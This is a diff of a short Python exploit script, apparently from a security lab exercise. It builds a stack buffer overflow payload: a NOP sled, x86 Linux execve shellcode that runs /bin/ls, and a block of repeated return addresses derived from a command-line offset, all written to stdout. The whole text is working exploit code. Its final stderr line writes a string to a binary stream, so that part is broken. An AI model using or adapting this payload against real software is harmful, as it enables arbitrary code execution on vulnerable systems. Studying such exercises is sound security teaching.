@@ -1,20 +1,20 @@
 import sys
+import os
 
 offset = int(sys.argv[1])
 
-NOPSLED = b'\x90'
-NOPSLED = str(NOPSLED,"ISO-8859-1")
-NOPSLED = NOPSLED * 0x200
+NOPSLED = bytes.fromhex('90')
+NOPSLED = NOPSLED * 0x53
 
-SHELLCODE1 = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
-SHELLCODE2 = "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
-SHELLCODE3 =  "\x80\xe8\xdc\xff\xff\xff/bin/ls"
-SHELLCODE = SHELLCODE1 + SHELLCODE2 + SHELLCODE3
+SHELLCODE = b"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/ls"
 
-RETURNADDRESS = b"c0000000"
-RETURNADDRESS = int(RETURNADDRESS, 16) - 0x4 * offset
-RETURNADDRESS = RETURNADDRESS.to_bytes(8, 'little')
-RETURNADDRESS = str(RETURNADDRESS,"ISO-8859-1")
-RETURNADDRESS = RETURNADDRESS * 0x200
+RETURNADDRESS = b"bffdf000"
+RETURNADDRESS = int(RETURNADDRESS, 16) + 0x20 * offset
+RETURNADDRESS = RETURNADDRESS.to_bytes(4, 'little')
+RETURNADDRESSBLOCK = RETURNADDRESS * 0x100
 
-print(NOPSLED + SHELLCODE + RETURNADDRESS)
+with os.fdopen(sys.stdout.fileno(), "wb", closefd=False) as stdout:
+    stdout.write(NOPSLED + SHELLCODE + RETURNADDRESSBLOCK + B'\n')
+
+with os.fdopen(sys.stderr.fileno(), "wb", closefd=False) as stderr:
+    stderr.write(str(RETURNADDRESS.hex()) + "\n")
